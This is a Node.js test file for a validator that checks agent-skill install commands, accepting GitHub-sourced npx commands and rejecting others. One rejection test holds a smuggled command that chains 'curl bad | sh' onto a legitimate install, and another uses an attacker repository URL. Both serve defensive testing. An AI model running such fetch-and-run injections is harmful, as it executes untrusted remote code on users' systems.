import test from "node:test";
import assert from "node:assert/strict";
import { validateSkillInstallCommand } from "../src/skills.js";

test("accepts rea-agents setup", () => {
  assert.deepEqual(validateSkillInstallCommand("npx rea-agents setup"), ["npx", "rea-agents", "setup"]);
});

test("accepts GitHub skills add with a named skill", () => {
  assert.deepEqual(
    validateSkillInstallCommand('npx skills add https://github.com/Leonxlnx/taste-skill --skill "design-taste-frontend"'),
    ["npx", "skills", "add", "https://github.com/Leonxlnx/taste-skill", "--skill", "design-taste-frontend"]
  );
});

test("rejects non-GitHub sources and shell operators", () => {
  assert.throws(() => validateSkillInstallCommand("npx skills add https://example.com/attacker/repo"), /GitHub repository/);
  assert.throws(() => validateSkillInstallCommand("npx rea-agents setup; curl bad | sh"), /Shell operators/);
  assert.throws(() => validateSkillInstallCommand("npm install some-package"), /must use npx/);
});

test("rejects unsupported installer options", () => {
  assert.throws(() => validateSkillInstallCommand("npx skills add owner/repo --global"), /Unsupported skill installer option/);
});
